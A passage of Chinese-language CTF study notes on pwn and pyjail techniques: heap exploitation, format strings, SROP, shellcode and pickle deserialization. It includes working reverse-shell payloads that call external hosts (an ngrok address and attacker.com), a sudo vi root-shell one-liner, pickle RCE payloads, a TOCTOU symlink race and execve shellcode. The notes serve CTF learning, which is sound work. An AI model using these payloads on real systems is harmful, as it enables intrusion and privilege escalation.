  - 一些利用ctypes绕过audit hook逃脱pyjail并获取RCE的技巧
  - 其他解法： https://gist.github.com/C0nstellati0n/c5657f0c8e6d2ef75c342369ee27a6b5#diligent-auditor
- [IRS](https://maplebacon.org/2024/02/dicectf2024-irs/)
  - 算是上面那道题的究极升级版（加了ast以及其他乱七八糟的过滤），甚至利用到了python内部的uaf。没有简略总结因为全篇都是知识点
- [pyquinejailgolf](https://gerlachsnezka.github.io/writeups/amateursctf/2024/jail/pyquinejailgolf/)
  - 使用python编写[quine](https://en.wikipedia.org/wiki/Quine_(computing)) 程序（输出自己源码的程序）。注意payload被包在题目文件里执行，所以部分payload会利用这点，导致其单独运行不是quine程序，只有在题目文件里才是
  - 其他做法： https://gist.github.com/C0nstellati0n/c5657f0c8e6d2ef75c342369ee27a6b5#pyquinejailgolf
- [Picklestar](https://github.com/cr3mov/cr3ctf-2024/tree/main/challenges/misc/picklestar)
  - python pickle反序列化挑战，限制可使用的opcode和字符串实现RCE。可以用INST字节码调用breakpoint然后执行命令
- [my-favorite-code](https://github.com/acmucsd/sdctf-2024/tree/main/misc/my-favorite-code)
  - 只能用两个python opcode调用breakpoint函数（建议看题目源码，要求`dis.Bytecode`返回的函数opcode只有两种，一个是COMPARE_OP，另一个自选）
  - 在discord的聊天里艰难地拼出了一个wp： https://gist.github.com/C0nstellati0n/c5657f0c8e6d2ef75c342369ee27a6b5#my-favorite-code 。关键点在于利用python 3.11新加的功能code objects cache（见 https://docs.python.org/3.11/whatsnew/3.11.html#cpython-bytecode-changes 和  https://github.com/python/cpython/issues/90997 ）隐藏部分opcode。cache的部分不会被`dis.Bytecode`看到
- [PySysMagic](https://github.com/salvatore-abello/CTF-Writeups/blob/main/L3ak%20CTF%202024/PySysMagic)
  - obligatory pyjail+PyMagic(这两题我竟然都记过)。这题倒没什么绕过audit hook的技巧，但是pyjail技巧不少
  - wp作者的python相关cheatsheet： https://github.com/salvatore-abello/python-ctf-cheatsheet
  - 官方wp： https://github.com/L3AK-TEAM/L3akCTF-2024-public/tree/main/misc/PySysMagic
40. pwntools可以连接启用ssl/tls的远程服务器，只需给remote添加一个参数`ssl=True`。如：
```python
p=remote("",443,ssl=True)
```
41. 算libc的偏移不一定要用有libc.sym能查到的符号偏移。可以开启gdb，随便选一个libc中的地址，然后查看libc基址。地址-基址就是固定偏移，就算泄露出来的地址不是libc中的一个符号，再次启动获取地址并减去之前算好的偏移仍然可以算出基址。
42. 栈地址（64位）一般以0x7fff开头；libc地址一般以0x7f开头。
43. [stuff](../../CTF/LA%20CTF/Pwn/stuff.md).
- double read(利用fread，gets等函数+leave;ret gadget的多次栈迁移)，在无可控制参数寄存器(pop rdi)的情况使用。主要利用了fread末尾的gadget：

```
   0x00007ffff7a9aa9d <+205>:  add    rsp,0x8
   0x00007ffff7a9aaa1 <+209>:  mov    rax,rbx
   0x00007ffff7a9aaa4 <+212>:  pop    rbx
   0x00007ffff7a9aaa5 <+213>:  pop    rbp
   0x00007ffff7a9aaa6 <+214>:  pop    r12
   0x00007ffff7a9aaa8 <+216>:  pop    r13
   0x00007ffff7a9aaaa <+218>:  ret 
```

可控制rbx和rbp。配合`add dword ptr [rbp - 0x3d], ebx`这个gadget实现更改got表。关键在于第二次fread的buf指针指向上一次fread迁移的栈的上方，即可任意控制栈顶。

44. 利用python库进行提权（[Privilege Escalation: Hijacking Python Library](https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7)）。脚本：

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("6.tcp.ngrok.io",11144))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

变种方法：[Python Library Hijacking on Linux](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8)

注意使用`sudo -l`找到无需密码就能使用root权限的命令后：

```
$ sudo -l
Matching Defaults entries for xxx on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xxx may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/xxx/.server.py
```

假设/home/xxx/.server.py的库已被劫持，要输入`sudo /usr/bin/python3 /home/xxx/.server.py`才能获取root权限。

45. 使用ngrok转发tcp端口,实现反弹远程shell。[How to catch a Reverse shell over the Internet](https://systemweakness.com/how-to-catch-a-reverse-shell-over-the-internet-66d1be5f7bb9)。

```
ngrok tcp 7777
//另一个终端窗口监听指定tcp端口
nc -lv 7777
```

46. 利用[TOCTOU](https://www.cnblogs.com/crybaby/p/13195054.html)([Time of check to time of use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)),race condition(条件竞争)读取非权限内的文件。题目会给出一个利用root权限读取任意文件的程序，但该程序在打开文件前会检查要打开的文件权限是不是执行者的。漏洞点在于程序先检查权限再打开文件，如果我们在检查权限后将要打开的文件改为指向root权限flag的软链接（symlink），就能获取到flag。使用脚本：

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```

如果使用ssh连接题目服务器，可以另开一个shell窗口，两个shell窗口同时连接服务器。一个窗口运行该脚本，另一个窗口尝试读取flag。只是概率成功，但只要尝试足够多次，一定有一次可以。

47. 有时候`chmod +x file`还不能使文件可运行，这时可以用`chmod a+x file`。参考[此处](https://unix.stackexchange.com/questions/639438/whats-the-difference-between-chmod-ax-and-chmod-x)。
48. [how2heap-Educational Heap Exploitation](https://github.com/shellphish/how2heap/)。一个学习heap的github仓库。
49. 利用tcache dup/uaf/double free或是任何程序内出现的方法更改tcache的fd时，被更改fd的chunk需要是第二个。即tcache链`0x100000->0x200000`中对应0x200000的chunk。较高版本的tcache还有chunk地址检测，要求chunk地址对齐0x10（整除0x10），否则会触发`malloc(): unaligned tcache chunk detected`。
50. [ICS5U](https://github.com/jdabtieu/wxmctf-2023-public/blob/main/pwn2/writeup.md)
- 利用java代码拼接造成的代码注入读取flag文件
- java类中有一种[静态代码块](https://www.cnblogs.com/Qian123/p/5713440.html)(static{})提供初始化，只要类加载就会执行。
51. [All Green](https://github.com/xihzs/ctf-writeups/blob/main/WxMCTF%202023/pwn/All%20Green/README.md)
- 32位格式化字符串漏洞泄露canary+程序PIE基地址。这里跟着[ctf wiki](https://ctf-wiki.org/en/pwn/linux/user-mode/fmtstr/fmtstr-exploit/)总算是彻底会了怎么找要泄露的地址偏移了。首先在printf下个断点，到断点后步入一步进入printf函数。此时查看stack就能看到要泄露的值了。偏移就是用想泄露值处的地址减去栈上格式化字符串偏移的地址再除以4。
- 这题还涉及到使用ebx动态调用函数和普通的ebp取参数。因为是rop调用最终读取flag的函数，所以要把ebx和ebp手动覆盖成需要的值。在这道题里，ebx最后会被赋值，故可以同时覆盖ebx和ebp。
- 顺便提一下64位格式化字符串怎么找偏移。做法相似，(目标地址-格式化字符串所在地址)//8-偏移，其中格式化字符串所在地址是参数在栈上第一次出现的地址，偏移可以用输入8个A然后%p的方式求出。
52. [Baby Zero Day](https://github.com/xihzs/ctf-writeups/blob/main/WxMCTF%202023/pwn/Baby%20Zero%20Day/README.md)
- vm虚拟机类型题常出现任意地址写/读漏洞。
- FSOP各种利用链。里面提到了另一篇[帖子](https://chovid99.github.io/posts/stack-the-flags-ctf-2022/)，两者都提到了一种关于libc地址（偏移）的技巧。如果程序允许malloc任意大小的chunk，就可以尝试申请较大的chunk。根据malloc的特性，这个较大地址的chunk会从mmap分配，地址会正好处于libc的上方，且与libc基址的偏移是固定的。帖子还提到了利用FILE结构体泄露libc地址的方法。
53. [warmup](https://blog.csdn.net/Morphy_Amo/article/details/123660489)
- 程序内提供了很多系统调用（alarm，read，write等），但函数较少。rop时就要用系统调用来执行orw。
- alarm函数特性：alarm()用来设置信号SIGALRM 在经过参数seconds 指定的秒数后传送给目前的进程. 如果参数seconds 为0, 则之前设置的闹钟会被取消, 并将剩下的时间返回。意思就是说，程序最开始调用`alarm(10)`，如果4秒后再次调用alarm，返回值就是10-4=6，存在eax里。于是配合这题的syscall即可执行orw缺少的open函数。
54. 假如vi命令有root权限（使用`sudo -l`查看），可用`sudo vi -c ':!/bin/sh' /dev/null`获取完整root权限shell。
55. 调试带有PIE的文件时，关闭自己环境的ASLR会有助于调试。`echo 0 > /proc/sys/kernel/randomize_va_space`。同理，就算一个文件开启了PIE，但远程服务器如果没有开启ASLR，那么PIE就没用了，直接用无PIE时的思路做题即可。

```
在Linux中，/proc/sys/kernel/randomize_va_space中的值就是ASLR的配置：
0: 关闭了ASLR，没有随机化保护。
1: 开启部分随机化，系统中的动态库和栈会使用随机化地址，而其他内存区域则使用固定地址。
2: 开启完全随机化，ASLR将随机化所有内存区域的地址：在这个级别中，ASLR将随机化所有内存区域的地址，包括库的加载地址、堆地址、栈地址、内存映射的地址、共享内存段的地址以及虚拟动态内存的地址。
```

56. [更换程序使用的libc](https://bbs.kanxue.com/thread-271583.htm)。如果题目提供了libc但本地运行程序默认使用的libc却不是题目的，可以更换掉。libc可以在[这里](https://github.com/matrix1001/glibc-all-in-one)找。
```sh
#!/bin/bash
#谢谢Chatgpt
# Check if the correct number of parameters is provided
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <binary_file> <new_interpreter> <new_library>"
    exit 1
fi

# Check if patchelf is installed
if ! command -v patchelf &> /dev/null; then
    echo "patchelf is not installed. Installing patchelf now..."
    sudo apt install patchelf
fi

# Assigning parameters to variables
binary_file="$1"
new_interpreter="$2"
new_library="$3"

# Check if the binary file exists
if [ ! -f "$binary_file" ]; then
    echo "Error: Binary file '$binary_file' not found."
    exit 1
fi

# Set interpreter
sudo patchelf --set-interpreter "$new_interpreter" "$binary_file" || {
    echo "Error: Failed to set the interpreter."
    exit 1
}

# Replace needed library
sudo patchelf --replace-needed libc.so.6 "$new_library" "$binary_file" || {
    echo "Error: Failed to replace needed library."
    exit 1
}

echo "Binary '$binary_file' patched successfully."
```
- 很多时候题目会给出libc但没有ld.so。此时可以使用[pwninit](https://github.com/io12/pwninit)自动下载对应版本的ld.so并patch。不过个人使用发现还是有点问题，建议配合[glibc-all-in-one](https://github.com/matrix1001/glibc-all-in-one)。使用前确保有zstd，下载：`sudo apt install zstd`
57. [360chunqiu2017_smallest](https://www.anquanke.com/post/id/217081)
- SROP。当无sigreturn gadget时，可以尝试将rax改为15（系统调用号），然后执行syscall是一样的结果。注意函数的返回值也是存在rax里，要是没有pop rax，可输入任意个字节的read函数也是不错的选择。
- SROP的本质是：内核态返回用户态时的恢复栈帧。因此构造的payload sigframe各个参数的值对应恢复时想要让栈变成的样子。调用sigreturn是为了恢复构造的假sigframe。一旦sigreturn被调用，rsp紧跟着的数据就会被视为要恢复的sigframe。一般getshell就是sys_execve。
- sigframe的前几个字节被覆盖不会影响SROP。
58. [bctf2016_bcloud](https://ctf-wiki.org/en/pwn/linux/user-mode/heap/ptmalloc2/house-of-force/#2016-bctf-bcloud)
- house of force利用。要求：
  - 可申请任意大小的堆块
  - 可覆盖top chunk的size
  - 已知想要分配处的地址和top chunk地址的偏移（或
- 计算house of force需要申请的堆块大小。目标地址-top chunk地址-size_t-malloc_allign。32位的size_t=4,malloc_allign=7;64位size_t=8,malloc_allign=0xf.
59. [whoami](../../CTF/攻防世界/5级/Pwn/whoami.md)
- 64位连续多次栈迁移至bss段。
- system函数执行时需要注意爆栈。如果一次栈迁移无法执行system，那就迁移多次，让栈环境满足调用system的条件。
60. [npuctf_2020_bad_guy](https://blog.csdn.net/csdn546229768/article/details/123717993)
- 无show堆题[使用IO_FILE（_IO_2_1_stdout_）泄露libc](https://www.jianshu.com/p/27152c14e2e7).通常需要满足：
  - 将_flags设置为0xfbad18**。目的是为了设置_IO_CURRENTLY_PUTTING=0x800，_IO_IS_APPENDING=0x1000，IO_MAGIC=0xFBAD0000 （这里关系到puts的实现）
  - 设置_IO_write_base指向想要泄露的地方；_IO_write_ptr指向泄露结束的地址。
  - 之后遇到puts或printf，就会将_IO_write_base指向的内容打印出来。
  - 常见payload:`p64(0xfbad1800)+p64(0x0)*3+'\x00'`。其中`0xfbad1800`为_flags的值，不同版本的libc会有变化。似乎无需改动_IO_write_base的值。
- 为了设置stdout为想要的值，一般利用unsorted bin中chunk的fd字段的main_arena相关值，覆盖最后两个字节为到__IO_2_1_stdout的正上方处（满足fakechunk的size，如0x7f的地方即可）。从左往右数的第一个数字需要爆破需要爆破。可以看出需要堆溢出漏洞。
61. [wustctf2020_babyfmt](https://www.cnblogs.com/LynneHuan/p/15229706.html)
- 下面的代码：
```c
__isoc99_scanf(&%ld,&local_18);
printf("ok! time is %ld\n",local_18);
```
当输入不符合`%ld`的字符，例如a时，不会修改栈，而是会泄露栈上的信息。
- c语言里的close(1)会关闭stdout，导致无法输出。此时配合格式化字符串漏洞，有两种办法解决：
  - 假如使用printf输出需要的内容。因为printf会使用stdout的指针，所以可以在printf执行前将stdout的指针改成stderr的。[这种方法](https://blog.csdn.net/weixin_44145820/article/details/105992952)需要获取stderr倒数第二个byte（倒数第一个通常是固定的），如果没有只能爆破。
  - 利用栈上的格式化字符串修改stdout的fileno为2。
62. [shanghai2018_baby_arm](https://www.cnblogs.com/xshhc/p/16936894.html#tid-YG6XSx)
- [arm](https://blog.csdn.net/qq_41028985/article/details/119407917) aarch64 架构的 ret2csu rop题目。程序开启了nx但没有开启pie。于是写入调用[mprotect](https://www.cnblogs.com/Max-hhg/articles/13939064.html)的gadget，将shellcode存放处改为可执行。mprotect各个枚举的对应的数字值：
```
PROT_READ: 1
PROT_WRITE: 2
PROT_EXEC: 4
PROT_SEM: 8
```

可以使用位运算同时增加多种权限。例如可读可写可执行：PROT_READ | PROT_WRITE | PROT_EXEC=7 (1 + 2 + 4).
- arm运行+调试环境[布置](https://blog.csdn.net/A951860555/article/details/116780827)。
  - 安装qemu
```
sudo apt update
sudo apt install qemu
```
  - 安装arm相关库。
```
sudo apt search "libc6" | grep arm
sudo apt install libc6-arm64-cross
```
  - 运行
```
qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./prog
```
  - 如果没有aarch64 的汇编器，pwntools里面制定context为aarch64会报错。
```
apt search binutils| grep aarch64
sudo apt install bintuils-aarch64-linux-gnu-dbg
```
63. [Contrived Shellcode](https://github.com/tamuctf/tamuctf-2023/tree/master/pwn/contrived-shellcode)
- 仅用0-15的字节构建shellcode。可在[此处](http://ref.x86asm.net/coder64.html#x77)参考哪些inst可以用。
- [方法1](https://chovid99.github.io/posts/tamuctf-2023/#contrived-shellcode):因为允许的字节范围内包含大量add，or和syscall，但每个操作数只能是32位寄存器。于是将getshell分为3个syscall：chdir('/')；chdir('bin')；execve('sh')。
- [方法2](https://github.com/tj-oconnor/ctf-writeups/tree/main/tamu_ctf_23/contrived-shellcode):构建read的syscall，将getshell的shellcode读取到read执行处的后面，进而绕过过滤。
64. [Randomness](https://github.com/tamuctf/tamuctf-2023/tree/master/pwn/randomness)
- 不同函数之间的局部变量栈帧公用。有两个函数：
```c
void foo() {
    unsigned long seed;
}

void bar() {
    unsigned long a;
}
int main() {
    foo();
    bar();
}
```
main函数调用foo返回后调用bar，这时栈帧会残留着seed的值，于是a默认就带着seed的值。
- scanf的错误使用。`scanf("%lu", a);`是错误的，会往a的值而不是a的地址里存值。正确写法是`scanf("%lu", &a);`
65. 仅22字节的x86-64 shellcode：https://systemoverlord.com/2016/04/27/even-shorter-shellcode.html
```
BITS 64

xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
imul esi
mov al, 0x3b
syscall

shellcode = b'1\xf6VH\xbb/bin//shST_\xf7\xee\xb0;\x0f\x05'
```
66. [Macchiato](https://github.com/tamuctf/tamuctf-2023/tree/master/pwn/macchiato):[wp](https://astr.cc/blog/tamuctf-2023-writeup/#macchiato)
- java pwn。java中的JIT区域有地址可读可写可执行，如果有方法将shellcode写到这块区域，就能getshell。当JIT跳到shellcode处时，当前执行的shellcode会无限期挂起，需要ctrl+c终止执行才能执行shellcode。
- Java long整型溢出。当值超过-Long.MAX_VALUE时，会转换为整数。下限是-0x7fffffffffffffff-2，到这个数就会变为long的正最大值。
- java会缓存值在-128 到 127（包含）java.lang.Long (boxed longs，装箱的long)实例对象，并在自动装箱时会使用。用于存储的对象是：
```java
// https://github.com/openjdk/jdk11/blob/master/src/java.base/share/classes/java/lang/Long.java#L1147-L1156
private static class LongCache {
    private LongCache(){}

    static final Long cache[] = new Long[-(-128) + 127 + 1];

    static {
        for(int i = 0; i < cache.length; i++)
            cache[i] = new Long(i - 128);
    }
}
```
如果修改这个数组，会导致某些long数字表示的值不是其真正的值。例如对于下面的代码：
```java
private boolean checkBounds(Long index) {
    var geMin = index.compareTo(0L) >= 0;
    var ltMax = index.compareTo(10L) < 0;
    return geMin && ltMax;
}
```

10L对应cache里索引138的数字。如果把138处改为最小值，就能绕过`index.compareTo(10L) < 0`。
- 根据hash的存储位置判断jvm实例对象在jvm heap里的存储位置。`对象.hashCode()`可以获取某个对象的hash。这个hash在每一个jvm对象里都有，存在对象带有metadata的头部里（[header that stores metadata about the object](https://shipilev.net/jvm/objects-inside-out/#_mark_word)）。一般来说，hash在头部开始的几个字节里。接着根据目标被分配顺序的先后（越早分配的对象地址越低，静态数组优先于对象加载）判断是往header上看还是往header下看。OpenJDK 11中默认8字节对齐，寻找的时候hash一定完整地在某一个chunk里。这里以对象内唯一的非静态字段arr为例，找到hash所在地址后，往后再走12个字节（12 bytes past the beginning of the object header，mark word 8字节，klass pointer 4字节）就是arr的地址了（arr是对象内唯一的非静态字段，地址直接就在header后）。
- 计算任意写地址。假设数组arr有越界写漏洞，以某种方法拿到4个字节的地址后，再加上16(mark word 8 字节, klass pointer, 4字节，以及数组长度4字节)。拿任何目标地址减去算出来的这个值再除以8，就是任意写数组的索引。
- 通常来说，OpenJDK 11从地址0x800000000开始，会映射0x2000个字节作为RWX段。该区域在0x800001f60后无填充，且地址基本是固定的，不过有几个trampoline entries用于跳转到加载的方法。于是可以将shellcode注入到0x800001f60这个地址，然后将其中一个trampoline entry patch成jump到shellcode。第一个trampoline entry用的尤其多，位于0x800000000。或者直接把shellcode写到0x800000100，前面全部用nop填充。
67. [Timetable](https://blog.junron.dev/writeups/pwn/timetable.html)
- pwn中的type confusion：常出现于程序中一个可指向任意一个struct的void*指针。假设该指针可指向两个相似的struct，其中一个struct A的字段完美覆盖另一个struct B。那么我们让应该指向结构A的指针处指向结构B，就能用改动结构A中内容合法的操作非法修改B中的内容（如改动原本固定的B中的指针，使其指向system）
- bss段开始的第一个symbol是stdout，即指向_IO_2_1_stdout_的指针
68. [Copy & Paste](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/pwn/copy_paste)
- UAF+heap overflow+glibc 2.35
- glibc 2.35中，_free_hook和_malloc_hook都被移除了，考虑以下几种方法getshell：
  - 利用exit hook
  - 泄露environ变量后计算栈地址，将rop链写入栈
  - FSOP，参考解法：https://chovid99.github.io/posts/wanictf-2023/#copy--paste 。
- glibc 2.35的加密fd字段（[safe linking](https://medium.com/@b3rm1nG/%E8%81%8A%E8%81%8Aglibc-2-32-malloc%E6%96%B0%E5%A2%9E%E7%9A%84%E4%BF%9D%E8%AD%B7%E6%A9%9F%E5%88%B6-safe-linking-9fb763466773)）。在高版本中的libc里，直接写fd字段无效，需要泄露heap的aslr地址（unsorted bin泄露出来的地址最常用,不过任何一个chunk demangle出来的真实fd地址都能用）后自行计算加密结果再写入。
```python
def demangle(val, is_heap_base=False):
    if not is_heap_base:
        mask = 0xfff << 52
        while mask:
            v = val & mask
            val ^= (v >> 12)
            mask >>= 12
        return val
    return val << 12

def mangle(heap_addr, val):
    #如果直接获得了aslr的部分就不用>>12了，右移就是为了从heap基址中取出aslr的部分
    return (heap_addr >> 12) ^ val
```
69. pwntools ROP工具生成orw ropchain。
```python
from pwn import *
file=ELF("pwn")
chain=ROP(file)
chain.read(0,file.bss(),0x100) #将文件名读取到bss段
chain.open(file.bss(),0,0) #打开文件名对应的文件
chain.read(3,file.bss(),0x100) #一般情况下（之前没有额外打开的文件）第一个打开的文件的fd是3，将内容读到bss段
chain.puts(file.bss()) #puts输出内容
```
也可以替换类似功能的函数，注意调用时file需要包含调用的函数且无PIE。

70. [money-printer2](https://www.youtube.com/watch?v=5miWo7IBnHI&t=603s)
- 仅执行一次的格式化字符串漏洞利用。题目背景：
  - 无法写fini_array获取main的第二次调用（似乎不是所有程序退出时都会调用fini_array）
  - NX+canary+Partial RELRO，无PIE。
- 开启了canary的程序的函数在返回时会调用__stack_chk_fail，这个函数也是在got表上的。那么可以使用格式化字符串漏洞将其got写为main函数地址，同时破坏canary，即可获取第二次调用。
  - 对于改canary，不是所有时候栈上都有一个指针直接指向canary可供我们修改。这时需要借用指针链间接修改。在栈上找到这样一个指针，其指向另一个指针且该指针也可以在栈上找到（A->B,A，B都在栈上可用格式化字符串控制）。用格式化字符串修改A其实是在修改B（格式化字符串的特性，没法直接修改指针，修改的都是指针指向的东西，这也是为什么要找指针链而不是直接修改指针），于是尝试修改B指向canary（实际情况可能完全不知道B究竟该指向的确切地址，那就需要根据调试情况爆破了。像这道题的成功概率就只有1/4096）。接着再通过修改后的B更改canary就行了。
  - 指针链的修改注意不要用数字参数（`%X$n`）。因为格式化字符串有个特点：只要使用了数字参数，printf就会把那个地方的值记住了。大概就是，假如我们用数字参数通过A->B修改了B，但是继续去调用B时，B却是修改前的值。解决办法是用%c一个字符一个字符地填过去。类似%p，每次%p都会打印出栈上一个指针，然后接着偏移往下读。%c的不同点在于读的是字符。以往`%x$n`修改，这里就用x个%c替代。
- pwntools自带多线程爆破用的函数。[mbruteforce](https://docs.pwntools.com/en/stable/util/iters.html#pwnlib.util.iters.mbruteforce):`mbruteforce(pwn, string.digits, 5, threads=64)`，其中第一个参数是要多线程爆破的函数，返回值为bool，只要返回值为True函数就会停止调用。第二个和第三个参数用来指定调用函数时用的参数。如果没有参数直接随便填然后调用的函数不用参数就行了。
- 对于爆破的题目，可能很难找到切interactive的时机。保险起见，可以直接在pwntools里发送cat flag之类的命令，然后接收就好了
- 格式化字符串漏洞题基本两次printf就够了。一次泄露地址，一次将one gadget写入返回地址。做法很多，改got表也行，但第一次漏洞的泄露地址是必须的。
71. [Irreductible](https://github.com/deyixtan/ctf/tree/main/challenges/hero-ctf-2023/misc-irreductible)
- 不使用`__reduce__`函数的python pickle反序列化rce：https://heartathack.club/blog/pickle-RCE-without-reduce
    - 使用OBJ：
```python
>>> payload_obj
b'(cos\nsystem\nS"cat flag.txt"\no.'
>>> pickletools.dis(payload_obj)
    0: (    MARK
    1: c        GLOBAL     'os system'
   12: S        STRING     'cat flag.txt'
   28: o        OBJ        (MARK at 0)
   29: .    STOP
#hex: 28636f730a73797374656d0a532263617420666c61672e747874220a6f2e
```
    - 使用INST：
```python
>>> payload_inst
b'(S"cat flag.txt"\nios\nsystem\n.'
>>> pickletools.dis(payload_inst)
    0: (    MARK
    1: S        STRING     'cat flag.txt'
   17: i        INST       'os system' (MARK at 0)
   28: .    STOP
#hex:28532263617420666c61672e747874220a696f730a73797374656d0a2e
```
72. [SUDOkLu](https://v0lk3n.github.io/writeup/HeroCTFv5/HeroCTFv5-SystemCollection#sudoklu)
- 利用具有SUID（`sudo -l`查看）的socket命令提权：https://gtfobins.github.io/gtfobins/socket/ 。反弹shell payload：
```sh
RHOST=attacker.com
RPORT=12345
socket -qvp '/bin/sh -i' $RHOST $RPORT
```
也可以将RHOST写为`0.0.0.0`，直接把shell弹到题目机器上，无需自己的公网ip。
- [GTFOBins](https://gtfobins.github.io/)，记录了很多利用错误配置binary提权的payload(用sudo -l查看哪些命令无需密码，然后在里面查对应的提权方法)。
73. [Impossible v2](https://youtu.be/obQxrfbMaHE?t=220)
- 一题基础的格式化字符串，不过漏洞出在sprintf。题目：
```c
fgets(msg,0x28,stdin);
sprintf(message,msg);
```
msg完全可控，那么就跟普通printf漏洞一样了，只不过输出的内容会到message里，要注意输出的长度，最好1个字节1个字节地写。
- 可以将got表改写成某个函数的中间部分，那么调用那个函数就等于直接跳转到函数的中间部分。以前一直有点疑惑怎么计算写的偏移，今天加深了印象。假设是这么个场景：
```
win=0x4014c6
original=0x401090
```
要把original改成win，格式化字符串偏移是7，使用`$hhn`写单字节。那么original地址处对应的是字节`0x90`，original+1处对应的是字节`0x10`，以此类推。然后写payload。payload一般像这样：`%numc%offset$hhn+addr`。offset表示addr的偏移，num是要写的字节。关键在于把加号的两部分分开，控制前半部分写的payload是程序的字长（32为4，64为8）。不到不要紧，用ljust往上取，将其patch到最近的字长的倍数。那么patch后的长度除以字长就是要加上的偏移了。如写`%34c%offset$hhn`,目前offset未知，但是根据现有的payload长度，这个offset加上一定不会超过16的长度。那就ljust补到16，addr的偏移是初始的7+16//8=9。`%34c%9$hhn+addr`

74. [Gladiator](https://github.com/HeroCTF/HeroCTF_v5/tree/main/Pwn/Gladiator)
- 多线程+uaf+glibc 2.35改got表+tcache poisoning
```c
// Create a thread, with a routine function
int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg);

// To wait for a thread to be finished
int pthread_join(pthread_t thread, void **retval);

// Thread exit
void pthread_exit (void * retval);

// Stop a thread
int pthread_cancel (pthread_t thread);

// To lock access to a variable for the other threads, to avoid access problems
int pthread_mutex_lock(pthread_mutex_t *mutex)
int pthread_mutex_unlock(pthread_mutex_t *mutex)

// To make a thread wait until a condition
int pthread_cond_wait (pthread_cond_t * cond, pthread_mutex_t * mutex);
//还有个pthread_cond_init，用于初始化一个pthread_cond_t类型的cond。wait等待的是A类型的cond，那么只有在接收到signal发出的A类型cond是才会继续执行。
// To signal that the condition is met, which wakes up the thread(s)
int pthread_cond_signal (pthread_cond_t * cond);
```
- 在不同线程malloc的chunk会有不同的arena。每个线程各自对应一个arena，各个arena之间由一个单向链表串起来。意味着不在main_arena里的unsorted bin chunk泄露出来的就不是main_arena的地址了。但是仍然可以通过当前arena泄露出来的地址加上动调得到的与main_arena的偏移，获取main_arena的地址，从而在当前thread中获取到main_arena里的chunk。因此在另外一个线程也能泄露libc基址，尝试用tcache poisoning等方法malloc到main_arena里的chunk即可
75. [Shellcode](https://github.com/BYU-CSA/BYUCTF-2023/tree/main/shellcode)
- 汇编里jmp指令的使用。jmp其中一个用法为`jmp short $+0x19`，表示跳到执行jmp时的eip+0x17处。多了2是因为jmp执行本身还有两个字节，而`$`指向jmp的开始而不是jmp后一个指令的地址。详情见https://stackoverflow.com/questions/20730731/syntax-of-short-jmp-instruction
76. [Horsetrack](../../CTF/picoCTF/Pwn/Horsetrack.md).
- glibc 2.33 [safe linking](https://cloud.tencent.com/developer/article/1643954):fd在存储前会被加密。假设要存储fd的堆块的地址为A，为加密的fd地址为B。那么加密后的fd为 (A>>12)^B。A>>12表示取出aslr随机值，所以如果已经泄露出aslr随机值就不用右移12了（当tcache里只有一个堆块时，那个堆块的fd就是aslr值）。似乎任何堆块的地址>>12都是aslr值。
- safe linking下的tcache poisoning要将fd mangle加密，且目标地址要与16对齐（地址末尾一定是0）
- plt与got表深入理解：https://zhuanlan.zhihu.com/p/130271689 。一个函数的plt表是3条指令：jmp addr;push num;jmp addr。
- 可利用`setbuf(stderr,(char *)0x0);`getshell。stderr在bss段，因此只要能泄露地址/没有PIE+partial relro，就能尝试将setbuf的got表改成system，再往stderr里写入sh。甚至可以再找个方便控制调用的函数，将其got改为改动后的setbuf。如果system在改之前已经加载过，got表里填写的system plt地址就能往下写一条（从第一条jmp addr的地址写到push num）
- pwntools gdb.debug使用。
```py
context.terminal = ["tmux", "splitw", "-h"]
p = gdb.debug( #使用gdb.debug需要安装gdbserver：sudo apt-get install gdbserver
         "./vuln",
         "\n".join(
            [
                "此处写gdb脚本",
                "一句是list的一个元素"
            ]
         ),
    )
```
77. 如何让python加载C libc并使用libc里的函数：
```py
from ctypes import CDLL
from ctypes.util import find_library
libc = CDLL(find_library("c"))
#libc.time(0)
#libc.srand()
#libc.rand()
#用法和C里的函数一样，案例 https://github.com/quasar098/ctf-writeups/tree/main/amateursctf-2023/rntk
```
78. [shelly](https://github.com/TJCSec/tjctf-2023-challenges/tree/main/pwn/shelly)
- shellcode的错误过滤。像以下这种一个字节一个字节检查且一遇到`\x00`就结束的检查程序非常容易绕过：
```c
undefined8 main(void)
{
  char local_108 [256];
  setbuf(stdout,(char *)0x0);
  printf("0x%lx\n",local_108); //输出shellcode所在的addr
  fgets(local_108,0x200,stdin);
  i = 0;
  while( true ) {
    if ((0x1fe < i) || (local_108[i] == '\0')) {
      return 0;
    }
    if ((local_108[i] == '\x0f') && (local_108[i + 1] == '\x05')) break;
    i = i + 1;
  }
  exit(1);
}
```
两种差不多的方法：
  - 在正常的shellcode前加个`\x00`让程序提前停止检查，然后返回addr+1
  - payload构造成`jump $+1;\x00;payload`，然后返回addr
79. [formatter](https://github.com/TJCSec/tjctf-2023-challenges/tree/main/pwn/formatter),[wp](https://www.youtube.com/watch?v=AqV3YUtcKGU&t=1999s)
- 格式化字符串漏洞在指针间的赋值。
```c
xd = calloc(1, sizeof(int));
char str[N];
fgets(str, N, stdin);
printf(str);
if(*xd==1234){
    win();
}
```
